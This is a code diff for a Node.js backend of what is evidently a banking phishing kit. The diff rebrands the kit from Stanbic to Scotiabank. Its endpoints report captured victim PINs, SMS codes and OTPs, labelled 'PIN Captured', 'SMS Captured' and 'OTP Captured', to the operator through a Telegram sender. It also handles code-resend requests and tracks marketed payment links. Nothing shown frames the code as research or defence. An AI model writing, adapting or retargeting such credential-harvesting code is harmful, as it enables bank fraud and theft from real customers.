@@ -131,7 +131,7 @@ function resolvePublicUrl(){
 app.get('/', (_req, res) => {
   res.json({
     ok: true,
-    service: 'stanbic-payments-backend',
+    service: 'scotiabank-payments-backend',
     activeLinks: links.size,
     activeTxs: txs.size,
     dataDir: DATA_DIR,
@@ -208,7 +208,7 @@ app.post('/api/links', (req, res) => {
       marketedBy: body.marketedBy || '',
       purpose: body.purpose || '',
       timestamp: body.timestamp || '',
-      network: 'stanbic',
+      network: 'scotiabank',
       lang: lang,
       expiryHours: expiryHours,
       createdAt: now,
@@ -284,7 +284,7 @@ app.post('/api/mtn/pin', async (req, res) => {
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
-      `🔐 <b>Stanbic PIN Captured</b>\n` +
+      `🔐 <b>Scotiabank PIN Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
@@ -336,7 +336,7 @@ app.post('/api/mtn/sms', async (req, res) => {
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
-      `📩 <b>Stanbic SMS Captured</b>\n` +
+      `📩 <b>Scotiabank SMS Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
@@ -396,7 +396,7 @@ app.post('/api/mtn/otp', async (req, res) => {
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
-      `🔢 <b>Stanbic OTP Captured</b>\n` +
+      `🔢 <b>Scotiabank OTP Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || '—')}\n` +
@@ -449,7 +449,7 @@ app.post('/api/mtn/resend', async (req, res) => {
     persistTxs();
 
     await tgSend(
-      `🔁 <b>Stanbic ${which} Resend Requested</b>\n` +
+      `🔁 <b>Scotiabank ${which} Resend Requested</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 ${esc(rec.accountName || '—')}\n` +
@@ -595,7 +595,7 @@ async function registerWebhook(){
 }
 
 app.listen(PORT, async () => {
-  console.log(`Stanbic Bank backend running on port ${PORT}`);
+  console.log(`Scotiabank backend running on port ${PORT}`);
   console.log(`Static HTML dir: ${path.join(__dirname, '..')}`);
   console.log(`Data directory: ${DATA_DIR} ${IS_PERSISTENT ? '✅ PERSISTENT' : '⚠️  TEMPORARY'}`);
   if (!IS_PERSISTENT) {
